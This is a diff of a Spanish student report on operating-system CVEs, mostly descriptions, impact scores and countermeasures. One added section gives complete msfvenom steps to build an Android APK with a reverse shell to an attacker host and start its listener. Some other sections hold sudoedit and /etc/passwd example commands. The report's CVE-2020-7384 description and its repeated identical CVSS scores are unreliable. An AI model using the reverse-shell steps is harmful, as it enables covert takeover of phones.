@@ -73,7 +73,68 @@ Se ofrece una breve clasificación de las mismas con diferentes secciones para o
 
 ## Vulnerabilidades Investigadas
 
-### 1 CVE-2023-41995 - Desbordamiento de búfer en el kernel de Linux
+### 1 CVE-2016-2414 - Minikin Android
+#### Descripción
+
+Esta es una vulnerabilidad encontrada en *MInikin* una implementación de la interfaz de renderizado de fuentes en Android. Es un componente clave de android al ser una parte integral del sistema de gráficos, al estar encargado de renderizar las fuentes y el manejo de varios aspectos referidos al texto.
+
+La vulnerabilidad existe debido a que *MInikin* contiene un error a la hora de parsear los archivos .TTF (archivos de fuentes de texto) correctamente. Esto podría permitir a un atacante establecer un bloqueo completo de un dispositivo Android mediante la carga de un archivo .TTF debidamente modificado para desencadenar un error que termina provocando continuos reinicios permanentes en el dispositivo y corrupción de memoria, por lo tanto un ataque de denegación de servicio (DoS).
+
+#### Impacto
+
+Base score: 6.2 Medio
+Impact score: 3.6
+Exploitability score: 2.5
+
+La explotación de esta vulnerabilidad puede conllevar a una pérdida de la integridad y denegación completa de la disponibilidad de los datos de un dispositivo que tenga instalado Android 5.0.x anteriores a la 5.0.2, 5.1.x anteriores a la 5.1.1 y 6.x anteriores al 1 de abril de 2016.
+
+#### Exploración y Explotación
+
+Esta vulnerabilidad podría explotarse mediante la instalación de un archivo .TTF debidamente preparado para la ocasión, por ejemplo mediante manipulación de bytes, una técnica en la cual se modifican los valores binarios de un archivo para que contenga la información necesaria para poder desencadenar el efecto malicioso en un objetivo aprovechando la vulnerabilidad.
+
+#### Contramedidas
+
+Para evitar vernos afectados por esta vulnerabilidad podríamos seguir las siguientes recomendaciones:
+
+- **Utilizar siempre las versiones más actualizadas de los sistemas operativos**, en este caso Android, que por lo general contienen actualizaciones que arreglan este tipo de problemas. (En este caso Google corrigió la vulnerabilidad en las actualizaciones de seguridad de Abril de 2016)
+- **Evitar descargar o instalar fuentes de terceros o de origen desconocido** para modificar nuestro sistema.
+- **Evitar abrir archivos adjuntos de correos electrónicos** cuyo remitente sea **desconocido o sospechoso**.
+<br>
+
+###  2 CVE-2022-2586 - Linux Kernel UAF
+
+#### Descripción
+
+Esta vulnerabilidad es una **vulnerabilidad de uso después de la liberación (UAF)** que se encuentra en el kernel de Linux.
+
+Esta vulnerabilidad permite a un atacante local, con privilegios, causar un problema de UAF en el momento de la eliminación de una tabla, lo que podría conducir a una escalada de privilegios local.
+
+La vulnerabilidad se encuentra en el código del kernel de Linux que maneja las tablas de nf_tables. Estas tablas se utilizan para implementar reglas de cortafuegos y otros filtros de paquetes. El código vulnerable libera incorrectamente un objeto de tabla después de haberlo utilizado, lo que permite al atacante acceder a la memoria liberada y modificarla.
+
+#### Impacto
+
+Base score: 6.7 Medio
+Impact score: 5.9
+Exploitability score: 0.8
+
+La explotación de esta vulnerabilidad podría permitir al atacante ejecutar código arbitrario con privilegios del kernel. Esto podría permitir al atacante tomar el control total del sistema. 
+
+Por lo que la confidencialidad, la integridad y la disponibilidad de los datos se ven afectados en su totalidad.
+
+#### Exploración y Explotación
+
+Hablamos de vulnerabilidad UAF (*Use-After-Free*) cuando en uno de los tantos procesos de manejo de memoria que ocurren en un sistema, un espacio concreto de memoria se libera por error. Mediante un exploit podríamos acceder a ese espacio de memoria que se ha liberado en un proceso concreto, en este caso la administración de unas tablas llamadas "*nf_tables*" del kernel de Linux que se utilizan para implementar reglas de cortafuegos y otros filtros de paquetes.
+
+En ese espacio de memoria el atacante mediante su exploit podría escribir directamente a nivel de kernel, por lo que podría establecerse con privilegios de administrador para poder tomar total control del sistema.
+#### Contramedidas
+
+Para protegerse de esta vulnerabilidad, los usuarios de sistemas Linux deben:
+
+* **Actualizar a la versión 5.18.11 o posterior del kernel de Linux.** Esta versión corrige la vulnerabilidad.
+* **Evitar ejecutar código arbitrario de fuentes desconocidas.** Esto podría ayudar a prevenir la explotación de la vulnerabilidad por parte de un atacante.
+<br>
+
+### 3 CVE-2023-41995 - Desbordamiento de búfer en el kernel de Linux
 
 #### Descripción
 
@@ -84,6 +145,9 @@ Esta vulnerabilidad se produce porque el kernel de Linux no libera correctamente
 El desbordamiento de búfer podría permitir al atacante ejecutar código arbitrario en el contexto del kernel. Esto significa que el atacante podría tener acceso a todos los recursos del sistema, incluyendo los datos confidenciales, los procesos y los servicios.
 
 #### Impacto
+Base score: 7.8 Alto
+Impact score: 5.9
+Exploitability score: 1.8
 
 La vulnerabilidad discutida tiene un impacto grave en los sistemas vulnerables. Como las anteriores, esta permite a un atacante que pueda explotarla tomar el control total del sistema, acceder a datos confidenciales o causar daños.
 
@@ -113,73 +177,6 @@ A fin de reducir el riesgo de explotación de esta vulnerabilidad, exponemos alg
 - **Mantener actualizado el antivirus.**
 <br>
 
-### 2 CVE-2023-44466 - Desbordamiento de búfer
-
-#### Descripción
-
-La vulnerabilidad CVE-2023-44466 es una vulnerabilidad de desbordamiento de búfer en el módulo de mensajería del kernel de Linux. Esto tiene su origen en el sistema de ficheros _Ceph_, ya que el módulo de mensajería es utilizado por Ceph para recibir paquetes TCP de una dirección IP. Antes de que se complete cualquier autorización, cualquier dispositivo con esa dirección IP puede enviar un paquete que produzca el susodicho desbordamiento de búfer en el kernel. Este desbordamiento de búfer puede permitir al atacante ejecutar código arbitrario en el contexto del kernel, así como una posible denegación de servicio.
-
-Esta se produce debido a una falta de validación de entrada en el código que se utiliza para procesar los mensajes enviados al subsistema de mensajería del kernel de Linux. Esto significa que un atacante puede proporcionar un mensaje malicioso que el kernel procesará incorrectamente, provocando un desbordamiento de búfer.
-
-#### Impacto
-
-Esta vulnerabilidad tiene un impacto moderado en los sistemas vulnerables, ya que un atacante pueda identificar la IP de un dispositivo que lee el sistema de archivos Ceph puede provocar una denegación de servicio y la ejecución remota de código en el kernel, lo que podría llevar a la toma de control sobre el sistema, el acceso a datos confidenciales o la posibilidad de causar daños.
-
-La vulnerabilidad en cuestión puede tener una serie de posibles consecuencias puestas en términos de confidencialidad, integridad y disponibilidad:
-
-- **Confidencialidad:** El atacante podría acceder a datos confidenciales, como contraseñas, información financiera o datos personales.
-- **Integridad:** El atacante podría modificar o destruir datos.
-- **Disponibilidad:** El atacante podría interrumpir los servicios o sistemas (_DoS_).
-
-Sin embargo, la vulnerabilidad podría no tener ningún impacto si el atacante no puede ejecutar código arbitrario en el contexto del kernel. En este caso, el atacante solo podría provocar una denegación de servicio.
-
-#### Exploración y Explotación
-
-Para explotar esta vulnerabilidad, un atacante debe tener acceso al sistema vulnerable. Una vez que este haya conseguido acceso al sistema, podrá enviar un mensaje malicioso al subsistema de mensajería del kernel de Linux, el cual lo procesará de forma incorrecta, produciendo así un desbordamiento del búfer. Éste podría permitir al atacante ejecutar código arbitrario en el contexto del kernel.
-
-#### Contramedidas
-
-A continuación resumimos algunas medidas que los usuarios deben tomar, con el objeto de evitar o limitar el riesgo de explotación de esta vulnerabilidad:
-
-- **Actualizar los sistemas a la última versión del kernel de Linux.** Esta versión corrige la vulnerabilidad CVE-2023-44466.
-- **Limitar el acceso al subsistema de mensajería del kernel de Linux.** Solo los usuarios autorizados deben tener acceso a este subsistema.
-- **Monitorear los sistemas en busca de signos de explotación de esta vulnerabilidad.** Los administradores de sistemas deben estar atentos a los signos de actividad maliciosa, como intentos de enviar mensajes maliciosos al subsistema de mensajería del kernel de Linux.
-<br>
-
-### 3 CVE-2023-39191 - Kernel de Linux eBPF
-
-#### Descripción
-
-La vulnerabilidad CVE-2023-39191 es una vulnerabilidad de validación de entrada en el subsistema _eBPF_[^1] del kernel de Linux. Estos programas se pueden utilizar para una variedad de propósitos, como la supervisión del rendimiento, el filtrado de tráfico y la creación de reglas de firewall.
-
-Esta vulnerabilidad se produce debido a una falta de validación de entrada en el subsistema eBPF. Esto significa que un atacante puede proporcionar datos maliciosos a un programa eBPF que el kernel ejecutará sin verificar.
-
-#### Impacto
-
-Esta vulnerabilidad tiene un impacto grave en los sistemas vulnerables, dado que un atacante que pueda explotarla puede ejecutar código en el contexto del kernel. Esto le permitiría al atacante tomar el control total del sistema, acceder a datos confidenciales o causar múltiples daños.
-
-El impacto potencial de la vulnerabilidad en términos de confidencialidad, integridad y disponibilidad de los datos o sistemas afectados es el siguiente:
-
-- **Confidencialidad:** El atacante podría acceder a datos confidenciales, como contraseñas, información financiera o datos personales.
-- **Integridad:** El atacante podría modificar o destruir datos.
-- **Disponibilidad:** El atacante podría interrumpir los servicios o sistemas.
-
-#### Exploración y Explotación
-
-Para explotar esta vulnerabilidad, un atacante debe tener privilegios _CAP_BPF_[^2]. Estos privilegios se pueden obtener mediante una variedad de métodos, como explotar otra vulnerabilidad o obtener acceso a un sistema comprometido.
-
-Una vez que el atacante tenga dichos privilegios, podrá proporcionar datos maliciosos a un programa eBPF, los cuales serán ejecutados por el kernel. Este código malicioso se podrá utilizar para controlar el sistema, acceder a datos confidenciales o causar daños.
-
-#### Contramedidas
-
-Para mitigar el riesgo de explotación de esta vulnerabilidad, los usuarios deben tomar las siguientes medidas:
-
-- **Actualizar los sistemas a la última versión del kernel de Linux.** Esta versión corrige la vulnerabilidad CVE-2023-39191.
-- **Limitar el acceso a los privilegios CAP_BPF.** Solo los usuarios autorizados deben tener estos privilegios.
-- **Implementar controles de acceso para proteger los programas eBPF.** Estos controles pueden ayudar a evitar que los atacantes proporcionen datos maliciosos a los programas eBPF.
-- **Monitorear los sistemas en busca de signos de explotación de esta vulnerabilidad.** Los administradores de sistemas deben estar atentos a los signos de actividad maliciosa, como intentos de ejecutar código arbitrario en el contexto del kernel.
-<br>
-
 ### 4 CVE-2021-3156 - Sudo (Baron Samedit)
 
 #### Descripción
@@ -191,6 +188,10 @@ Ejemplo: `sudoedit -s '\' perl -e 'print "A" x 65536'`
 Esta vulnerabilidad afecta a varios sistemas operativos como Ubuntu 20.04 (Sudo 1.8.31), Debian 10 (Sudo 1.8.27) y Fedora 33 (Sudo 1.9.2) y demás sistemas operativos que usen estas versiones de sudo.
 
 #### Impacto
+
+Base score: 7.8 Alto
+Impact score: 5.9
+Exploitability score: 1.8
 
 El impacto de la vulnerabilidad es crítico ya que afecta directamente la confidencialidad, integridad y disponibilidad de los datos al obtener privilegios de root:
 
@@ -212,6 +213,7 @@ También la podríamos detectar y explotar a través de herramientas que escanea
 
  La mayoría de las distribuciones ya han lanzado actualizaciones para corregir esto, por lo que la actualización del sistema o del paquete de sudo solucionará esta vulnerabilidad.
 <br>
+
 ### 5 CVE-2023-26604 - Systemd 246
 
 #### Descripción
@@ -221,6 +223,10 @@ Systemd anterior a la versión 247 no bloquea adecuadamente la escalada de privi
 Systemd es un conjunto de procesos de administración de sistema, bibliotecas y herramientas que interactuan con el núcleo del Sistema operativo.
 
 #### Impacto
+
+Base score: 7.8 Alto
+Impact score: 5.9
+Exploitability score: 1.8
 
 - **Disponibilidad:** Un atacante podría utilizar esta vulnerabilidad para detener o interrumpir los servicios críticos del sistema. Por ejemplo, podría ejecutar el comando "systemctl stop nginx" para detener el servidor web nginx.
 - **Integridad:** Un atacante podría utilizar esta vulnerabilidad para modificar o eliminar archivos críticos del sistema. Por ejemplo, para ejecutar el comando "cp /etc/passwd /tmp/passwd" y copiar el archivo de contraseñas.
@@ -260,65 +266,18 @@ se ejecuta en modo "seguro". Esto significa que estas funciones están deshabili
 También se puede compilar Less para que esté permanentemente en modo "seguro". Para ello tenemos que modificar el archivo sudoers y añadir la variable: 
 env_keep=LESSSECURE
 <br>
-### 6 CVE-2016-2414 - Minikin Android
-#### Descripción
 
-Esta es una vulnerabilidad encontrada en *MInikin* una implementación de la interfaz de renderizado de fuentes en Android. Es un componente clave de android al ser una parte integral del sistema de gráficos, al estar encargado de renderizar las fuentes y el manejo de varios aspectos referidos al texto.
-
-La vulnerabilidad existe debido a que *MInikin* contiene un error a la hora de parsear los archivos .TTF (archivos de fuentes de texto) correctamente. Esto podría permitir a un atacante establecer un bloqueo completo de un dispositivo Android mediante la carga de un archivo .TTF debidamente modificado para desencadenar un error que termina provocando continuos reinicios permanentes en el dispositivo y corrupción de memoria, por lo tanto un ataque de denegación de servicio (DoS).
-
-#### Impacto
-
-La explotación de esta vulnerabilidad puede conllevar a una pérdida de la integridad y denegación completa de la disponibilidad de los datos de un dispositivo que tenga instalado Android 5.0.x anteriores a la 5.0.2, 5.1.x anteriores a la 5.1.1 y 6.x anteriores al 1 de abril de 2016.
-
-#### Exploración y Explotación
-
-Esta vulnerabilidad podría explotarse mediante la instalación de un archivo .TTF debidamente preparado para la ocasión, por ejemplo mediante manipulación de bytes, una técnica en la cual se modifican los valores binarios de un archivo para que contenga la información necesaria para poder desencadenar el efecto malicioso en un objetivo aprovechando la vulnerabilidad.
-
-#### Contramedidas
-
-Para evitar vernos afectados por esta vulnerabilidad podríamos seguir las siguientes recomendaciones:
-
-- **Utilizar siempre las versiones más actualizadas de los sistemas operativos**, en este caso Android, que por lo general contienen actualizaciones que arreglan este tipo de problemas. (En este caso Google corrigió la vulnerabilidad en las actualizaciones de seguridad de Abril de 2016)
-- **Evitar descargar o instalar fuentes de terceros o de origen desconocido** para modificar nuestro sistema.
-- **Evitar abrir archivos adjuntos de correos electrónicos** cuyo remitente sea **desconocido o sospechoso**.
-<br>
-
-###  7 CVE-2022-2586 - Linux Kernel UAF
-
-#### Descripción
-
-Esta vulnerabilidad es una **vulnerabilidad de uso después de la liberación (UAF)** que se encuentra en el kernel de Linux.
-
-Esta vulnerabilidad permite a un atacante local, con privilegios, causar un problema de UAF en el momento de la eliminación de una tabla, lo que podría conducir a una escalada de privilegios local.
-
-La vulnerabilidad se encuentra en el código del kernel de Linux que maneja las tablas de nf_tables. Estas tablas se utilizan para implementar reglas de cortafuegos y otros filtros de paquetes. El código vulnerable libera incorrectamente un objeto de tabla después de haberlo utilizado, lo que permite al atacante acceder a la memoria liberada y modificarla.
-
-#### Impacto
-
-La explotación de esta vulnerabilidad podría permitir al atacante ejecutar código arbitrario con privilegios del kernel. Esto podría permitir al atacante tomar el control total del sistema. 
-
-Por lo que la confidencialidad, la integridad y la disponibilidad de los datos se ven afectados en su totalidad.
-
-#### Exploración y Explotación
-
-Hablamos de vulnerabilidad UAF (*Use-After-Free*) cuando en uno de los tantos procesos de manejo de memoria que ocurren en un sistema, un espacio concreto de memoria se libera por error. Mediante un exploit podríamos acceder a ese espacio de memoria que se ha liberado en un proceso concreto, en este caso la administración de unas tablas llamadas "*nf_tables*" del kernel de Linux que se utilizan para implementar reglas de cortafuegos y otros filtros de paquetes.
-
-En ese espacio de memoria el atacante mediante su exploit podría escribir directamente a nivel de kernel, por lo que podría establecerse con privilegios de administrador para poder tomar total control del sistema.
-#### Contramedidas
-
-Para protegerse de esta vulnerabilidad, los usuarios de sistemas Linux deben:
-
-* **Actualizar a la versión 5.18.11 o posterior del kernel de Linux.** Esta versión corrige la vulnerabilidad.
-* **Evitar ejecutar código arbitrario de fuentes desconocidas.** Esto podría ayudar a prevenir la explotación de la vulnerabilidad por parte de un atacante.
-<br>
-### 8 CVE-2018-4087 - iOS Core Bluetooth
+### 6 CVE-2018-4087 - iOS Core Bluetooth
 
 #### Descripción
 
 
 
 #### Impacto
+
+Base score: 7.8 Alto
+Impact score: 5.9
+Exploitability score: 1.8
 
 
 
@@ -327,7 +286,8 @@ Para protegerse de esta vulnerabilidad, los usuarios de sistemas Linux deben:
 
 #### Contramedidas
 <br>
-### 9 Dirty pipe (CVE-2022-0847)
+
+### 7 CVE-2022-0847 - Dirty pipe
 #### Descripción: 
 Es una vulnerabilidad en el kernel de Linux desde la versión 5.8 en adelante que permite sobrescribir datos en archivos de solo lectura. Esto conduce a una escalada de privilegios porque los procesos sin privilegios pueden inyectar código en los procesos raíz.
 
@@ -339,6 +299,10 @@ El fallo se produce porque la función no inicializa correctamente la variable d
 Una vez que el atacante ha escrito datos en el búfer del pipe, podría enviar los datos a un archivo de solo lectura, como "/etc/passwd". 
 
 #### Impacto: 
+
+Base score: 7.8 Alto
+Impact score: 5.9
+Exploitability score: 1.8
 
 Esta vulnerabilidad tiene graves impactos sobre la disponibilidad, integridad y confidencialidad de los datos:
 
@@ -375,6 +339,129 @@ Ej:
 - Implementar un sistema de detección de intrusiones (IDS) para que nos ayude a detectar el ataque.
 - La vulnerabilidad se solucionó en Linux 5.16.11, 5.15.25 y 5.10.102 por lo que usar una de estas versiones nos solucionaría el problema.
 <br>
+
+### 8 CVE-2020-7384 - MSFVENOM
+## Descripción
+El framework msfvenom de Metaexploit permite a un usuario malintencionado crear y publicar APK's que permiten la ejecución de comandos controlados por el atacante en el dispositivo android donde se ha instalado.
+
+## Impacto
+
+Base score: 7.8 Alto
+Impact score: 5.9
+Exploitability score: 1.8
+
+Un atacante que pueda explotar esta vulnerabilidad podría tomar el control completo de un dispositivo android. Esto podría permitirles robar datos, instalar malware o incluso tomar el control físico del dispositivo, por ejemplo, para hacer fotos, mandar sms's, geocalizar a la persona, etc...
+
+- Disponibilidad: El atacante podría controlar el dispositivo por lo que podría borrar datos, bloquear el acceso, etc...
+- Integridad: El atacante podría modificar o eliminar datos lo que podria dañar el dispositivo o la información que contiene.
+- Confidencialidad: El atacante podría robar datos como contraseñas, fotos, datos bancarios, etc... lo que comprometeria la privacidad y los datos podrian ser utilizados para cometer fraude o robar su identidad.
+
+## Exploración y explotación
+
+Para explotar esta vulnerabilidad lo unico que necesitariamos es una máquina con kali linux para crear el apk que contendrá una reverse shell hacia nuestra máquina, de esta manera cuando se instale en un dispositivo, tendremos control total sobre ese dispositivo.
+
+Los pasos para realizar la explotación son los siguientes:
+
+```bash
+# Creamos la app maliciosa indicandole nuestra Ip y el puerto 443 que es por donde estaremos a la escucha:
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=443 -o app.apk
+# Abrimos la consola:
+msfconsole
+# Usamos el multihandler:
+use /multi/handler
+# Modificamos el payload con nuestra dirección y puerto que hemos especificado en el apk:
+set payload android/meterpreter/reverse_tcp
+set LHOST 192.168.1.120
+set LPORT 443
+# Iniciamos el payload:
+run
+# Ahora estaremos a la escucha para cuando un atacante acceda a la app infectada, podamos tener acceso total a su dispositivo.
+```
+
+## Contramedidas
+
+-No descargar nunca apk's desconocidas que suelen ofrecernos servicios de pago de forma gratuita ya que estas suelen tener malware.
+-Actualizar siempre el móvil a la última versión disponible.
+-Tener instalado siempre un antivirus/antimalware en el dispositivo.
+
+<br>
+
+### 9 CVE-2023-39191 - Kernel de Linux eBPF
+
+#### Descripción
+
+La vulnerabilidad CVE-2023-39191 es una vulnerabilidad de validación de entrada en el subsistema _eBPF_[^1] del kernel de Linux. Estos programas se pueden utilizar para una variedad de propósitos, como la supervisión del rendimiento, el filtrado de tráfico y la creación de reglas de firewall.
+
+Esta vulnerabilidad se produce debido a una falta de validación de entrada en el subsistema eBPF. Esto significa que un atacante puede proporcionar datos maliciosos a un programa eBPF que el kernel ejecutará sin verificar.
+
+#### Impacto
+
+Base score: 8.2 Alto
+Impact score: 6
+Exploitability score: 1.5
+
+Esta vulnerabilidad tiene un impacto grave en los sistemas vulnerables, dado que un atacante que pueda explotarla puede ejecutar código en el contexto del kernel. Esto le permitiría al atacante tomar el control total del sistema, acceder a datos confidenciales o causar múltiples daños.
+
+El impacto potencial de la vulnerabilidad en términos de confidencialidad, integridad y disponibilidad de los datos o sistemas afectados es el siguiente:
+
+- **Confidencialidad:** El atacante podría acceder a datos confidenciales, como contraseñas, información financiera o datos personales.
+- **Integridad:** El atacante podría modificar o destruir datos.
+- **Disponibilidad:** El atacante podría interrumpir los servicios o sistemas.
+
+#### Exploración y Explotación
+
+Para explotar esta vulnerabilidad, un atacante debe tener privilegios _CAP_BPF_[^2]. Estos privilegios se pueden obtener mediante una variedad de métodos, como explotar otra vulnerabilidad o obtener acceso a un sistema comprometido.
+
+Una vez que el atacante tenga dichos privilegios, podrá proporcionar datos maliciosos a un programa eBPF, los cuales serán ejecutados por el kernel. Este código malicioso se podrá utilizar para controlar el sistema, acceder a datos confidenciales o causar daños.
+
+#### Contramedidas
+
+Para mitigar el riesgo de explotación de esta vulnerabilidad, los usuarios deben tomar las siguientes medidas:
+
+- **Actualizar los sistemas a la última versión del kernel de Linux.** Esta versión corrige la vulnerabilidad CVE-2023-39191.
+- **Limitar el acceso a los privilegios CAP_BPF.** Solo los usuarios autorizados deben tener estos privilegios.
+- **Implementar controles de acceso para proteger los programas eBPF.** Estos controles pueden ayudar a evitar que los atacantes proporcionen datos maliciosos a los programas eBPF.
+- **Monitorear los sistemas en busca de signos de explotación de esta vulnerabilidad.** Los administradores de sistemas deben estar atentos a los signos de actividad maliciosa, como intentos de ejecutar código arbitrario en el contexto del kernel.
+<br>
+
+### 10 CVE-2023-44466 - Desbordamiento de búfer
+
+#### Descripción
+
+La vulnerabilidad CVE-2023-44466 es una vulnerabilidad de desbordamiento de búfer en el módulo de mensajería del kernel de Linux. Esto tiene su origen en el sistema de ficheros _Ceph_, ya que el módulo de mensajería es utilizado por Ceph para recibir paquetes TCP de una dirección IP. Antes de que se complete cualquier autorización, cualquier dispositivo con esa dirección IP puede enviar un paquete que produzca el susodicho desbordamiento de búfer en el kernel. Este desbordamiento de búfer puede permitir al atacante ejecutar código arbitrario en el contexto del kernel, así como una posible denegación de servicio.
+
+Esta se produce debido a una falta de validación de entrada en el código que se utiliza para procesar los mensajes enviados al subsistema de mensajería del kernel de Linux. Esto significa que un atacante puede proporcionar un mensaje malicioso que el kernel procesará incorrectamente, provocando un desbordamiento de búfer.
+
+#### Impacto
+
+Base score: 8.8 Alto
+Impact score: 5.9
+Exploitability score: 2.8
+
+Esta vulnerabilidad tiene un impacto moderado en los sistemas vulnerables, ya que un atacante pueda identificar la IP de un dispositivo que lee el sistema de archivos Ceph puede provocar una denegación de servicio y la ejecución remota de código en el kernel, lo que podría llevar a la toma de control sobre el sistema, el acceso a datos confidenciales o la posibilidad de causar daños.
+
+La vulnerabilidad en cuestión puede tener una serie de posibles consecuencias puestas en términos de confidencialidad, integridad y disponibilidad:
+
+- **Confidencialidad:** El atacante podría acceder a datos confidenciales, como contraseñas, información financiera o datos personales.
+- **Integridad:** El atacante podría modificar o destruir datos.
+- **Disponibilidad:** El atacante podría interrumpir los servicios o sistemas (_DoS_).
+
+Sin embargo, la vulnerabilidad podría no tener ningún impacto si el atacante no puede ejecutar código arbitrario en el contexto del kernel. En este caso, el atacante solo podría provocar una denegación de servicio.
+
+#### Exploración y Explotación
+
+Para explotar esta vulnerabilidad, un atacante debe tener acceso al sistema vulnerable. Una vez que este haya conseguido acceso al sistema, podrá enviar un mensaje malicioso al subsistema de mensajería del kernel de Linux, el cual lo procesará de forma incorrecta, produciendo así un desbordamiento del búfer. Éste podría permitir al atacante ejecutar código arbitrario en el contexto del kernel.
+
+#### Contramedidas
+
+A continuación resumimos algunas medidas que los usuarios deben tomar, con el objeto de evitar o limitar el riesgo de explotación de esta vulnerabilidad:
+
+- **Actualizar los sistemas a la última versión del kernel de Linux.** Esta versión corrige la vulnerabilidad CVE-2023-44466.
+- **Limitar el acceso al subsistema de mensajería del kernel de Linux.** Solo los usuarios autorizados deben tener acceso a este subsistema.
+- **Monitorear los sistemas en busca de signos de explotación de esta vulnerabilidad.** Los administradores de sistemas deben estar atentos a los signos de actividad maliciosa, como intentos de enviar mensajes maliciosos al subsistema de mensajería del kernel de Linux.
+<br>
+
+
 ## Conclusiones
 
 Durante el proceso de este proyecto nos hemos adentrado en conceptos y definiciones claves en la ciberseguridad, como exploit, vulnerabilidad, UAF o EBPF. Al haber elegido los sistemas operativos como nuestro tema hemos tenido que indagar sobre componentes básicos de computación, e intentar comprender superficialmente al menos su funcionamiento para entender el motivo de la vulnerabilidad.
